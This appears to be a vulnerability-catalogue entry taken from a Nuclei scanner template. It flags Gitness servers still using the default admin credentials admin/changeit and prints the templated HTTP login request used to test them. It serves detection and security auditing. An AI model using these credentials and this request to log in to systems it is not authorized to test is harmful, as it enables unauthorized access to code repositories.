# Vulnerability: Gitness - Default Login
**Classification:** GITNESS
**Source:** Nuclei Template (`gitness-default-login.yaml`)

## Description
Detected Gitness instance was found using default admin credentials (admin/changeit).

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/login?include_cookie=true HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"login_identifier":"{{username}}","password":"{{password}}"}
```

